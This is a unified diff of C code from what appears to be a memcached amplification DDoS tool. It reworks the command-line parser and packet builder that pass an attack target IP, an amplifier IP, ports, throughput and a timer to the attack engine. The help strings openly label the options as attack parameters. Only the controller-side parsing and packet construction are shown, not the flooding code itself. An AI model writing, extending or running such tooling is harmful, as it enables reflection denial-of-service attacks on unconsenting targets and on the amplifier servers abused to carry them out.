@@ -1,10 +1,6 @@
-#include <argp.h>
-#include <argz.h>
-
-
 #include "venus.h"
+#include "common/cliparser.h"
 #include "interface/interface.h"
-#include "interface/configr.h"
 #include "monitor/crake.h"
 #include "netuno/netuno.h"
 
@@ -14,41 +10,39 @@
 #define DEFAULT_TIMER 0
 #define DEFAULT_TARGETPORT 80
 
+#define ARG_MIRROR 'm'
 #define ARG_TARGETIP 't'
 #define ARG_AMPLIFIERIP 'a'
 #define ARG_AMPPORT 'p'
 #define ARG_TARGPORT 'g'
-#define ARG_FULL 600
-#define ARG_TIMER 601
+#define ARG_THP 'h'
+#define ARG_TIMER 'i'
 
-const char *argp_program_bug_address = "rqtx@protonmail.com";
-const char *argp_program_version = "version 0.1";
-
-struct argp_option atkArgpOption[] =
+static ArgsOpt atkArgpOption[] =
 {
-    { "target", ARG_TARGETIP, "target_ipv4", 0, "Attack target IPV4"},
-    { "amplifier", ARG_AMPLIFIERIP, "amp_ipv4", 0, "Memcached amplifier IPV4"},
-    { "amport", ARG_AMPPORT , "am_port", 0, "Amplifier port"},
-    { "targport", ARG_TARGPORT, "targ_port", 0, "Target port"},
-    { "full", ARG_FULL, "thp", 0, "Full attack with arg throughput"},
-    { "timer", ARG_TIMER, "timer", 0, "Attack timer"},
+    { ARG_MIRROR, "mirror", true, true, "Mirror type"},
+    { ARG_TARGETIP, "target", true, true, "Target IPV4"},
+    { ARG_AMPLIFIERIP, "amplifier", true, true, "Amplifier IPV4"},
+    { ARG_AMPPORT , "amport", true, false, "Amplifier port"},
+    { ARG_TARGPORT, "targport", true, false, "Target port"},
+    { ARG_THP, "thp", true, false, "Attack throughput"},
+    { ARG_TIMER, "timer", true, false, "Attack timer"},
     { 0 }
 };
 
-int ParserAttackOpt (int key, char *arg, struct argp_state *state)
+int parserAttackOpt (char key, char *arg, ArgState *state)
 { 
-    LhfDraft * draft = state->input;
+    LhfDraft *draft = state->input;
   
     switch (key)
     {
-        case ARGP_KEY_ARG:
+        case ARG_MIRROR:
             if( !strcmp(arg, "test") || !strcmp(arg, "Test") || !strcmp(arg, "TEST") )
             {
                 draft->amp_port = CRAKE_DEFAULT_PORT;
                 draft->target_port = CRAKE_DEFAULT_PORT;
                 draft->type = TEST;
-                draft->initialThroughput = 1;
-                draft->typeThroughput = 1;
+                draft->throughput = 0;
                 draft->timer = 60;
                 draft->amp_port = CRAKE_DEFAULT_PORT;
             }
@@ -66,16 +60,14 @@ int ParserAttackOpt (int key, char *arg, struct argp_state *state)
             }
             else
             {
-                argp_state_help(state, stdout, ARGP_NO_EXIT); 
-                return UNKNOWCMD; 
+                Efatal(ERROR_CLI, "Invalid input");
             }
             break;
         
         case ARG_TARGETIP:
             if( !is_valid_ipv4(arg) )
             {
-                argp_state_help(state, stdout, ARGP_NO_EXIT);
-                return ERRORIP;
+                Efatal(ERROR_CLI, "Invalid input");
             }
             memcpy(draft->target_ip, arg, strlen(arg));   
             break;
@@ -83,8 +75,7 @@ int ParserAttackOpt (int key, char *arg, struct argp_state *state)
         case ARG_AMPLIFIERIP:
             if( !is_valid_ipv4(arg) )
             {
-                argp_state_help(state, stdout, ARGP_NO_EXIT); 
-                return ERRORIP;
+                Efatal(ERROR_CLI, "Invalid input");
             }
             memcpy(draft->amp_ip, arg, strlen(arg));
             break;
@@ -97,9 +88,8 @@ int ParserAttackOpt (int key, char *arg, struct argp_state *state)
             draft->target_port = (atoi(arg) > 0) ? atoi(arg) : DEFAULT_TARGETPORT;
             break;
 
-        case ARG_FULL:
-            draft->initialThroughput = (atoi(arg) > 0) ? atoi(arg) : 0;
-            draft->typeThroughput = FULL;
+        case ARG_THP:
+            draft->throughput = atoi(arg);
             break;
     
         case ARG_TIMER:
@@ -108,14 +98,12 @@ int ParserAttackOpt (int key, char *arg, struct argp_state *state)
   }
   return 0;
 }
-static struct argp argpAtk = { atkArgpOption, ParserAttackOpt, "CMD" };
 
-Packet * CreateCmdPacket( CmdType p_type, int p_argc, char **p_argv )
+Packet * CreateCmdPacket( CmdType p_type, int p_argc, char **p_argv, char *p_destip )
 {
     CommandPkt *cmdPkt = NULL;
     Packet *pac = CreateEmptyPacket();
-    char *destip = GetServerIP();
-    int err = 0;
+    ArgsCore argsAtk = { atkArgpOption, parserAttackOpt };
 
     memalloc( &cmdPkt , sizeof(CommandPkt) );
     
@@ -129,10 +117,11 @@ Packet * CreateCmdPacket( CmdType p_type, int p_argc, char **p_argv )
             cmdPkt->type = AttackCmd;
             cmdPkt->dataSize = sizeof(LhfDraft);
             SetDraftDefaultData(&cmdPkt->data);
-            if( (err = argp_parse(&argpAtk, p_argc, p_argv, 0, 0, &cmdPkt->data)) == 0 )
+            if( ParserCLI(&argsAtk, p_argc, p_argv, &cmdPkt->data) == ERROR_CLI )
             {
-                break;
+                Efatal(ERROR_CLI, "FATAL CLI ERROR");
             }
+            break;
         default:
             memfree( &cmdPkt );
             return NULL;
@@ -141,24 +130,23 @@ Packet * CreateCmdPacket( CmdType p_type, int p_argc, char **p_argv )
     pac->type = LHF;
     pac->packet_ptr = cmdPkt;
 
-    if( NULL != destip)
+    if( NULL != p_destip)
     {
         pac->pkt_size = COMMANDPKT_HEADERSIZE + cmdPkt->dataSize;
-        strcpy( pac->ip_dest,destip);
+        strcpy( pac->ip_dest,p_destip);
         pac->dest_port = DEFAULT_COMPORT;
-        pac->netSock = -1;
         pac->saddr.sin_family = AF_INET;
         pac->saddr.sin_port = htons(DEFAULT_COMPORT);
-        pac->saddr.sin_addr.s_addr = inet_addr(destip);
+        pac->saddr.sin_addr.s_addr = inet_addr(p_destip);
     }
     return pac;
 }
 
 void SetDraftDefaultData( LhfDraft *p_draft )
-{    
+{   
+    p_draft->type = TEST;
     p_draft->target_port = DEFAULT_TARGETPORT;
     p_draft->amp_port = 0;
-    p_draft->initialThroughput = 0;
-    p_draft->typeThroughput = INCREMENT;
+    p_draft->throughput = 1;
     p_draft->timer = DEFAULT_TIMER;
 }
